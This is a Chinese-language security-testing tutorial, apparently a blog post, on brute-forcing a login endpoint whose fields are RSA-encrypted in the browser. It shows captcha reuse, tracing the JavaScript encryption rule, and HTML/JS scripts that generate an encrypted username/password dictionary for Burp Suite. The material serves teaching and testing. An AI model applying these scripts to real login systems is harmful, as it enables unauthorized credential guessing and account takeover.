##### 一、导语

随着时间的推移，安全也越来越被大家开始关注，随之而来的就有各种内容加密，本文简单对登录接口暴力破解时字段被加密，如何处理加密内容进行暴破来进行一个简单的分享。

##### 二、正文

登录接口如下：  
![image.png](https://image.3001.net/images/20220825/1661396675_6306e6c37ebf75e899554.png!small)

BP上代理，输入账号密码验证码点击登录，查看历史记录分析。  
![image.png](https://image.3001.net/images/20220825/1661396676_6306e6c435cfd27218db1.png!small)  
可以看到发送了一个获取验证码的请求，内容为base64的图片和对应的key  
继续查看登录验证请求，进行分析  
![image.png](https://image.3001.net/images/20220825/1661396676_6306e6c4cbbe224581ed6.png!small)  
当图片对应的key和字符正确时请求将会接受进行查询。  
但是验证码每次都是独立获取的，且响应中存在key值，我们只需调用刷新验证的请求，获取key值和正确字符进行替换，那么就可以保证每次请求的内容有效。

我们再输入用户名2进行抓包  
验证码错误提示error  
![image.png](https://image.3001.net/images/20220825/1661396677_6306e6c56a337d32b9e36.png!small)  
复制用户2的信息替换到之前用户1的请求中重放。验证码依旧使用用户1的。  
![image.png](https://image.3001.net/images/20220825/1661396678_6306e6c601a00032d80e4.png!small)  
验证同一验证码可多次重复使用。  
存在验证码重用的问题，但是请求加密了不能直接进行爆破。所以我们需要分析前端加密代码逻辑。

###### 1.根据关键字快速定位加密字段

打开浏览器调试模式，根据请求包的关键字在js脚本中进行搜索进帮助我们快速定位  
定位到一个ajax请求  
![image.png](https://image.3001.net/images/20220825/1661396678_6306e6c6a01618cec767c.png!small)  
可以看到smsg的内容调用了rsa函数，加密内容为sMsgStr这个变量。  
同时可以看到js文件夹下rsa.min.js文件，根据命名查看内容得知为rsa加密方法。

###### 2.根据关键字快速定位加密规则

继续搜索关键字，追踪变量 sMsgStr，可以看到为各字段组合拼接内容。  
![image.png](https://image.3001.net/images/20220825/1661396679_6306e6c72d34a5d8eb24d.png!small)  
那么逻辑就很清晰了，我们只需获取各字段进行拼接，之后调用rsa函数加密即可。

###### 3.根据加密规则获取各字段值

方法一：通过数据包获取  
直接在数据包中搜索关键字端即可。

方法二：通过调试获取设置断点  
设置断点  
![image.png](https://image.3001.net/images/20220825/1661396679_6306e6c7baf63bdbcc4e1.png!small)  
刷新页面，  
输入内容，点击登录![image.png](https://image.3001.net/images/20220825/1661396680_6306e6c83c0a18b424046.png!small)  
进行断点调试

这里点击进入下一个断点查看值。  
可以看到 authType 值为1  
![image.png](https://image.3001.net/images/20220825/1661396681_6306e6c934d4ff9bb930a.png!small)  
继续调试获取其他字段值  
![image.png](https://image.3001.net/images/20220825/1661396681_6306e6c9a54d4d0310c04.png!small)至此我们获得了各字段值  
分析拼接规则，还调用了getLengthStr函数，继续在js中依据关键字搜索。

    
    
    var sMsgStr = authType + getLengthStr(username) + getLengthStr(password) + getLengthStr(responseType)
                    + getLengthStr(clientId) + username + password + responseType + clientId;//拼接规则
    

得到该函数内容  
![image.png](https://image.3001.net/images/20220825/1661396682_6306e6ca28f1fef4ac8c7.png!small)  
最后我们只需要调用rsa函数对拼接内容加密即可。  
通过请求包获取各字段值，编写验证脚本。

###### 4.编写测试脚本验证

    
    
    <html>
    <script src="https://www.test.com/js/rsa.min.js?ver=20220811"></script>
    <script src="https://www.test.com/js/jquery-1.8.3.min.js?ver=20220811"></script>
    <script>
    
    var getLengthStr = function (str) {
            var length = str.length;
            if (length < 10) {
                return '0' + length;
            } else if (length < 100) {
                return '' + length;
            }
            return '00';
        };
    
        var rsa = new RSAKey();
        rsa.setPublic(window.UUAP_STATIC._encode_key, window.UUAP_STATIC._key_plus);
     var authType = 1;//通过数据包或调试获取
    var username = "test";//自定义用户名
        var password = '123qweASD@';//自定义密码
        var responseType = 'code';//通过数据包或调试获取
        var clientId = 'uuapclient-465109485371793408-oKZZj';//通过数据包或调试获取
        var sMsgStr = authType + getLengthStr(username) + getLengthStr(password) + getLengthStr(responseType)
                    + getLengthStr(clientId) + username + password + responseType + clientId;//拼接规则
        var okk = rsa.encrypt_b64(sMsgStr);//加密后的内容
    
    document.write(encodeURIComponent(okk)+ "
    "); //由于拼接内容有特殊符号，使用函数encodeURIComponent进行url编码拼接,打印出来
    
    </script>
    </html>
    

将用户名置空，测试加密内容是否正确  
![image.png](https://image.3001.net/images/20220825/1661396682_6306e6ca9ac85d04a129a.png!small)  
保存为html文件打开。

![wKg0C2L2DViAPRS7AACGGn6ygSM709.png](https://image.3001.net/images/20220825/1661396683_6306e6cb2757f7bc1d496.png!small)  
复制加密内容到BP进行重放验证，根据提示可知，验证脚本正确。  
![image.png](https://image.3001.net/images/20220825/1661396683_6306e6cbb2298e17744e5.png!small)  
再次修改用户名为test进行验证，根据提示可知，验证脚本正确。  
![image.png](https://image.3001.net/images/20220825/1661396684_6306e6cc4b6da6d0d5cf7.png!small)

###### 5.编写脚本批量生成字典

编写脚本批量输出用户名或密码加密后内容

    
    
    <html>
    <script src="https://test.com/js/rsa.min.js?ver=20220811"></script>
    <script src="https://test.com/js/jquery-1.8.3.min.js?ver=20220811"></script>
    <script>
    
    var getLengthStr = function (str) {
            var length = str.length;
            if (length < 10) {
                return '0' + length;
            } else if (length < 100) {
                return '' + length;
            }
            return '00';
        };
    
        var rsa = new RSAKey();
        rsa.setPublic(window.UUAP_STATIC._encode_key, window.UUAP_STATIC._key_plus);
     var authType = 1;
        var responseType = 'code';
    var username = "test";
        var password = '123qweASD@';
        var responseType = 'code';
        var clientId = 'uuapclient-465109485371793408-oKZZj';
        var sMsgStr = authType + getLengthStr(username) + getLengthStr(password) + getLengthStr(responseType)
                    + getLengthStr(clientId) + username + password + responseType + clientId;
        var okk = rsa.encrypt_b64(sMsgStr);
    
    //document.write(encodeURIComponent(okk)+ "
    "); //由于拼接内容有特殊符号，使用函数encodeURIComponent进行url编码拼接
    
    var namelist = ["admin","chenxiuzhen"]; //替换用户名列表
    var passlist = ["passwd","Dandy123"];  //替换密码列表
    
        //输出用户名加密后的内容
    for (var i=0;i<namelist.length;i++)
    { 
      
        var username = namelist[i];
        var sMsgStr = authType + getLengthStr(username) + getLengthStr(password) + getLengthStr(responseType)
                    + getLengthStr(clientId) + username + password + responseType + clientId;
        var okk = rsa.encrypt_b64(sMsgStr);
        document.write((username)+"
    ");
        document.write(encodeURIComponent(okk)+ "
    ");
      
    }
    
        //输出密码加密后的内容
        for (var i=0;i<passlist.length;i++)
        { 
      
            var password = passlist[i];
            var sMsgStr = authType + getLengthStr(username) + getLengthStr(password) + getLengthStr(responseType)
                    + getLengthStr(clientId) + username + password + responseType + clientId;
            var okk = rsa.encrypt_b64(sMsgStr);
            document.write((password)+"
    ");
            document.write(encodeURIComponent(okk)+ "
    ");
      
        }
    
    
    </script>
    </html>
    

效果图：  
![image.png](https://image.3001.net/images/20220825/1661396684_6306e6ccc162b40829f06.png!small)  
输出内容，复制粘贴保存为字典，最后根据字典使用BP进行爆破操作。  
![image.png](https://image.3001.net/images/20220825/1661396685_6306e6cd856b355e1482c.png!small)

##### 三、总结

整体内容并不复杂，相对正常测试加入了一部分前端分析调试的内容，希望大家在安全测试过程中可以多抱着学习的态度，多点耐心和认真，早日成为安全专家。

